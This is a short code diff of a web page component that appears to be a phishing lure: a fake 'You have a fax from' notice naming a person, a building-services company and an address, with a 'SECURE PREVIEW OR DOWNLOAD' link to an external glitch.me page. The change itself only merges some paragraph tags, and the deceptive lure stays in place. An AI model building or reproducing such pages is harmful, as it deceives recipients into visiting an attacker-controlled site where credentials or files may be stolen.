@@ -9,8 +9,8 @@ const SecondPage = () => (
     <Seo title=" " />
     <h1>You have a fax from</h1>
     <p>Gerry Savage</p>
-    <p>PREAH Building Services</p>
-    <p>Campbell House, First Floor</p>
+    <p>PREAH Building Services
+Campbell House, First Floor
 Greenside Road, M8 Central Business Park
 Newhouse, ML1 5FL</p>
     <Link to="https://quiver-plant-amount.glitch.me/zzz.html">SECURE PREVIEW OR DOWNLOAD</Link>
